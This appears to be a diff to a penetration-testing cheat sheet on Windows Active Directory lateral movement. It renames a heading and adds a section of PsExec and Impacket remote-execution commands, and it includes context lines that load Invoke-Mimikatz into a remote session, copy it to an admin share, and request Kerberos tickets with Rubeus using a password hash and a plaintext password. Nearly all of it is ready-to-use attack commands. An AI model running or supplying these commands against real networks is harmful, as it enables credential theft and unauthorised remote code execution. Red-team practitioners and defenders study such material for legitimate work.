@@ -253,7 +253,7 @@ If functions not on remote host:-
 ```. ./Invoke-Mimikatz.ps1```
 ```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```
 
-##### Copy Across
+##### Copy File Across
 ```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
 ``` ls //Server1.local/c$/temp```
 
@@ -273,6 +273,19 @@ If functions not on remote host:-
 ```Rubeus.exe asktgt /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /ptt```
 
 ```Rubeus.exe asktgt /user:webadmin /password:Password01 /ptt```
+
+* * *
+
+#### PSExec and Impacket
+
+```PsExec.exe -accepteula \\$HOSTNAME cmd```
+
+```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
+```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
+
 
 
 * * *
